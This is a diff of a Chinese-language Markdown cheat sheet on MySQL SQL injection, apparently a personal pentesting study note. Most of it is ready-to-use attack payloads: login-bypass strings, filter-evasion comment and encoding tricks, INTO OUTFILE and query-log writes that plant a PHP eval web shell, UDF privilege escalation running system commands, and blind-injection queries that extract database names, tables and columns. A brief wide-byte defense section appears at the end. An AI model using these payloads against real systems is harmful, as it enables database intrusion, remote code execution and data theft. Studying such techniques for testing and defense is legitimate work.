@@ -62,7 +62,9 @@
     此处`%23`即为url编码中的`#`，在mysql中`#`的作用是注释符（`--+`；`--` ；`#`；均为注释符号）
 
 2. `1=1`、`1=2`测试法，流程如下（**数字型注入**）
+
     
+
     ① `url?id=1`② `url?id=1 ;and 1=1`③ `url?id=1 ;and 1=2`
 
     存在注入漏洞的表现:
@@ -77,11 +79,14 @@
 
     还可以使用特定函数来判断，比如输入`1 and version()>0`，程序返回正常，说明`version()`函数被数据库识别并执行，而`version()`函数是MySQL特有的函数，因此可以推断后台数据库为MySQL。
 
+    
+
     **数字型注入常用总结**
     ??? "点击展开/收起"
 
+        ```
         and1=2--+
-
+        
         'and1=2--+
         
         "and1=2--+
@@ -93,32 +98,186 @@
         ")and1=2--+
         
         "))and1=2--+
+        ```
+
+    
+
+    **tips**
+
+    数字型注入时，可以不用逻辑运算，用数字运算。
+
+    `+` `-` `*` `/` `div` `mod`
+
+    ```
+    select 2-(select 1)
+    select 4 div(select 3)
+    ```
+
+    
+
+
 
 
 ##### 漏洞利用手法
 
-1.利用 Sql 漏洞绕过登录验证
+1. 利用 Sql 漏洞绕过登录验证
 
-> 利用注释符#和1=1的恒成立来绕过登陆验证
+    > 利用注释符#和1=1的恒成立来绕过登陆验证
 
-一般情况下弱类型密码是很难手动爆破的，例如123
+    一般情况下弱类型密码是很难手动爆破的，例如123
 
-但是若存在sql漏洞，在用户名中输入 `123' or 1=1 #`, 密码输入 `123' or 1=1 #`（也可空白），则可以验证成功
+    但是若存在sql漏洞，在用户名中输入 `123' or 1=1 #`, 密码输入 `123' or 1=1 #`（也可空白），则可以验证成功
 
-实际执行的语句是：
+    实际执行的语句是：
 
-`select * from users where username='123' or 1=1 #' and password='123' or 1=1 #'`
+    `select * from users where username='123' or 1=1 #' and password='123' or 1=1 #'`
 
-按照 Mysql 语法，# 后面的内容会被忽略，所以实际执行的语句如下
+    按照 Mysql 语法，# 后面的内容会被忽略，所以实际执行的语句如下
 
-`select * from users where username='123' or 1=1 `
+    `select * from users where username='123' or 1=1 `
 
 
-在用户名中输入 `123' or '1'='1`, 密码输入 `123' or '1'='1`（不加单引号会造成语法错误），实际执行语句如下
+    在用户名中输入 `123' or '1'='1`, 密码输入 `123' or '1'='1`（不加单引号会造成语法错误），实际执行语句如下
+    
+    `select * from users where username='123' or '1'='1' and password='123' or '1'='1`
+    
+    **or条件使and两端验证结果有一个成立即可都成立，从而绕过验证，无需使用注释符**
 
-`select * from users where username='123' or '1'='1' and password='123' or '1'='1`
+2. 自带函数来探测显位
 
-**or条件使and两端验证结果有一个成立即可都成立，从而绕过验证，无需使用注释符**
+        system_user() //系统用户名
+        user() //用户名
+        current_user //当前用户名
+        session_user() //连接数据库的用户名
+        database() //数据库名
+        version() //MYSQL数据库版本
+        @@datadir //读取数据库路径
+        @@basedir //MYSQL 安装路径
+        @@version_compile_os //操作系统
+
+3. 空格和注释
+
+    http中 `%20` ` ` `+` 都是空格
+
+    mysql中 `%09` `%0A` `%0B` `%0C` `%0D`都是空白符，效果和`%20`一样，linux可能还支持`%A0`
+
+    特殊符号，注释，也可以当
+
+            select user() # 被注释的内容
+            select user() -- 被注释的内容
+            select/*被注释的内容*/user()
+            /*!50000Select*/user()
+
+    其中`/*!50000Select*/user()`为内联注释
+
+    当mysql版本号 ≥ 5.00.00：注释内容会被执行，相当于 `Select user()`
+
+    小于的时候不会执行
+
+    注释也可以嵌套使用
+
+            select/*adsafsadf/*asfdasf*/user()
+            select user()/*!50000union/*!50000select*/database()
+
+
+4. 运算符
+
+    and为逻辑运算符，可被 `or` `xor` `not`代替，同时`and=&&` `or=||` `xor=^` `not=!`
+
+    `select * from user where not(0=1);`
+
+
+
+5. 文件读取导出
+
+    **outfile**和**dumpfile**，必须root，必须开启`secure_file_priv`，必须有绝对路径，必须拼接在`select`最后，必须可以使用单引号。如果无法控制查询最终内容，`outfile`可拼接如下4个。
+
+    `lines terminated by`
+    `lines starting by`
+    `fields terminated by`
+    `columns terminated by `
+
+    ```mysql
+    select * from user where id=1 union select 1,'<?php phpinfo();>',3,4 into dumpfile '/home/1.php'
+    select * from user where id =1 order by 1 limit 0,1 into outfile '/home/1.php' lines terminated by '<?php phpinfo();>'
+    ```
+
+    **load_file**, 必须root，必须开启`secure_file_priv`，必须有绝对路径
+
+    ```mysql
+    select load_file('/home/1.php')
+    ```
+
+    bypass 单引号
+
+    ```mysql
+    select 'root'
+    select char(114,111,111,116)
+    select 0x726F6F74
+    ```
+
+
+
+6. 高版本的一些tips
+
+    在mysql5.7版本，新增了sys公共库，使得我们可以在`information`被过滤了之后使用sys库里的一些表来查询库和表
+
+    ```
+    SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
+    SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
+    SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='test' GROUP BY table_name;
+    SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='test' GROUP BY table_name;
+    ```
+
+    mysql8.0.21之后，增加`table`和`information_schema.TABLESPACES_EXTENSIONS`
+
+    ```
+    (table information_schema.TABLESPACES_EXTENSIONS limit 0,1)
+    ```
+
+    增加`values`
+
+    ```
+    select 1,2,3 where 1 = 1 union values row(1,2,3)
+    ```
+
+7. log写入shell
+
+    ```mysql
+    show global variables like '%general_log%';
+    set global general_log=on;
+    set global general_log_file='D://x.php';
+    select "<?php eval($_POST['x']) ?>";
+    set global general_log=off;
+    ```
+
+    ```mysql
+    show global variables like '%query_log%';
+    set global slow_query_log=on;
+    set global slow_query_log_file='D://x.php';
+    show variables like '%log%';
+    select '<?php phpinfo();?>' from mysql.db where sleep(2);
+    set global slow_query_log=off;
+    ```
+
+8. udf提权
+
+    ```mysql
+    select @@basedir;
+    show variables like '%plugins%';
+    create function cmdshell returns string soname 'udf.dll';
+    select cmdshell('whoami');
+    select * from mysql.func;
+    delete from mysql.func where name='cmdshell';
+    ```
+
+    加载恶意`udf.so/udf.dll`也可以用来执行系统命令
+    ```mysql
+    1';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so'; -- # 创建系统命令sys_eval
+     ```
+
+9. mysql_fake_sever
+    后续其他补充其他知识点后补充
 
 #### 其他实用语句
 
@@ -182,7 +341,7 @@ _	仅替代一个字符
 
 `123%`以123开头的数据；`%123%`包含123的数据；`_123`第一个字符后是123的数据，同理`1_2_3`
 
-### 常见注入方法
+### 其他常见注入方法
 
 #### `union`联合查询
 
@@ -232,6 +391,11 @@ _	仅替代一个字符
 
 - `group_concat()`:显示所有查询到的数据
 
+**tips**
+
+`union select`可用`union all select`/`union distinct select`/`union distinctrow select`代替
+
+`order by` 可用`group by`代替
 
 
 #### 布尔盲注
@@ -258,25 +422,25 @@ _	仅替代一个字符
 ??? "点击展开/收起"
 
     （1）求当前数据库长度
-
+    
     （2）求当前数据库表的ASCII
-
+    
     （3）求当前数据库中表的个数
-
+    
     （4）求当前数据库中其中一个表名的长度
-
+    
     （5）求当前数据库中其中一个表名的ASCII
-
+    
     （6）求列名的数量
-
+    
     （7）求列名的长度
-
+    
     （8）求列名的ASCII
-
+    
     （9）求字段的数量
-
+    
     （10）求字段内容的长度
-
+    
     （11）求字段内容对应的ASCII
 
    ~~步骤非常繁琐，当然大家都不手注~~
@@ -287,103 +451,103 @@ _	仅替代一个字符
     ###### 求当前数据库的长度
 
     思路：利用`length`或者`substr`函数来完成
-
+    
     `length`函数
-
+    
     - str    返回字符串的长度
-
+    
     `substr`函数
-
+    
     - str    字符串
     - pos    截取字符串开始位置
-
+    
     `length`    截取字符的长度
-
+    
     `length` 函数返回长度，例如8是当前数据库'security'的长度
-
+    
     `SELECT * from users WHERE id = 1 and (length(database())=8)`
-
+    
     - 也可以使用 `> `、`<` 符号来进一步缩小范围
-
+    
     `SELECT * from users WHERE id = 1 and (length(database())>8)`
-
+    
     - 当长度正确就页面就显示正常，其余页面则显示错误
-
+    
     `substr`函数
-
+    
     在构造SQL语句之时，and后面如果跟着一个大于0的数，那么SQL语句正确执行，所以利用此特性，使用`substr`截取字符，当截取的字符不存在，再通过`ascii`函数处理之后将会变成false，页面将回显错误
-
+    
     - `substr` 返回子字符串
     - 8是当前数据库'security'的长度 ，从第8个开始，取1位，则是'y'
     - 如果pos为9 那么开始位置大于字符串长度，ascii函数处理后将变成false
     - and 后只要不为 0, 页面都会返回正常
-
+    
     `SELECT * from users WHERE id = 1 and ascii(substr(database(),8,1))`
-
+    
     ###### 求当前数据库名
-
+    
     思路：利用`left` 函数，从左至右截取字符串
-
+    
     截取字符判断字符的`ascii`码，从而确定字符
-
+    
     -- 从左至右截取一个字符
-
+    
     `SELECT * from users WHERE id = 1 and (left(database(),1)='s')`
-
+    
     -- 从左至右截取两个字符
-
+    
     `SELECT * from users WHERE id = 1 and (left(database(),2)='se')`
-
+    
     `SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),1,1)) = 115)`
-
+    
     `SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),2,1)) = 101)`
-
+    
     使用`>`，`<` 符号来比较查找，找到一个范围，最后再确定
-
+    
     ###### 求当前数据库存在的表的数量
-
+    
     `SELECT * from users WHERE id = 1 AND `
-
+    
     ``(select count(table_name) from information_schema.`TABLES`; where table_schema = database()) = 4``
-
+    
     ###### 求当前数据库表的表名长度
-
+    
     - length
-
+    
     ``SELECT * from users WHERE id = 1 AND (LENGTH((select table_name from information_schema.`TABLES` where table_schema = database() LIMIT 0,1))) = 6``
     
     - substr
-
+    
     ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),6,1))``
-
+    
     ###### 求表名
-
+    
     ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),1,1)) = 101``
-
+    
     ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),2,1)) = 109``
-
+    
     ###### 求指定表中列的数量
-
+    
     ``SELECT * from users WHERE id = 1 AND (select count(column_name) from information_schema.columns where table_name = "users") = 3``
-
+    
     ###### 求指定表中列的长度
-
+    
     ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = "users" limit 0,1),2,1))``
-
+    
     ###### 求指定表中的列名
-
+    
     ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = "users" limit 0,1),1,1)) = 105``
-
+    
     ###### 求指定表中某字段的数量
-
+    
     ``SELECT * from users WHERE id = 1 AND (select count(username) from users) = 13``
-
+    
     ###### 求字段长度
-
+    
     ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select username from users  limit 0,1),4,1))``
-
+    
     ###### 求字段名
-
+    
     ``SELECT * from users WHERE id = 1 and ASCII(SUBSTR((select username from users  limit 0,1),1,1))  = 68``
 
 
@@ -434,6 +598,53 @@ MySQL 会计算 expr 指定的表达式 count 次，返回结果始终是 0
 
 后面的盲注过程与布尔盲注类似
 
+##### 多表`information_schema`查询
+
+
+
+```mysql
+(select count(*) from information_schema.columns A, 
+ information_schema.columns B, information_schema.columns C)
+```
+
+**笛卡尔积查询**：
+
+对`information_schema.columns`自连接3次,产生巨大临时表,起到延时作用
+
+
+
+
+
+**tips**
+
+盲注时，可以用比较运算符
+
+`=` `<>` `!=` `%` `between` `not between` `in` `not in` `LIKE` `REGEXP` `RLIKE`
+
+```mysql
+select user()%sleep(1)
+(select ascii(substr((select user()),1,1)))=114 
+select ascii(substr((select user()),1,1)) between 113 and 115 #在范围里
+select ascii(substr((select user()),1,1)) in (113,114,115) # 在集合中
+select user() like 'root%' #模式匹配
+select user() regexp 0x5E726F6F5B612D7A5D # 0x5E726F6F5B612D7A5D=^roo[a-z] 正则匹配
+```
+
+也可以用字符串比较函数
+
+```mysql
+select strcmp(user(),'root@localhost')
+select find_in_set(1,1)
+```
+
+无`select`，只能注同表的列
+
+```mysql
+select * from user where id = 1 and mid((username)from(1)for(1))='a'
+```
+
+
+
 
 
 
@@ -478,6 +689,18 @@ MySQL 会计算 expr 指定的表达式 count 次，返回结果始终是 0
 `alter table " table_name" change " column1" " column2" type;`
 
 `alter table "table_name" rename "column1" to "column2";`
+
+
+
+**tips**
+
+无select
+
+```mysql
+set @a = 0x73656C65637420757365722829;PREPARE b FROM @a;EXECUTE b;
+```
+
+
 
 #### 无列名注入
 
@@ -663,11 +886,11 @@ Mysql中转义的函数有`addslashes`，`mysql_real_escape_string`，`mysql_esc
 进行内部操作前，按照如下规则转化请求为内部操作字符集
 
     使用字段 `CHARACTER SET` 设定值
-
+    
     若上述值不存在，使用对应数据表的`DEFAULT CHARACTER SET`设定值
-
+    
     若上述值不存在，则使用对应数据库的`DEFAULT CHARACTER SET`设定值
-
+    
     若上述值不存在，则使用`character_set_server`设定值（默认gbk编码）
 
 执行完 SQL 语句之后，将执行结果按照 `character_set_results` 编码进行输出。
@@ -737,14 +960,29 @@ $id = iconv('utf-8', 'gbk', $id); # 由utf-8 –> gbk
 ##### 防护
 
     使用mysql_set_charset(GBK)指定字符集
-
+    
     SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary
     
     使用mysql_real_escape_string进行转义
-
+    
     mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集（使用mysql_set_charset指定字符集），不会出现前面的df和5c拼接为一个宽字节的问题
     以上两个条件需要同时满足才行，缺一不可。
 
 
 
 [参考](https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/#/)
+
+[参考](https://www.freebuf.com/articles/web/261524.html#/)
+
+
+
+## SqlSever
+挖坑
+
+## SqlLite
+
+
+## PostSql
+
+
+## Oracle
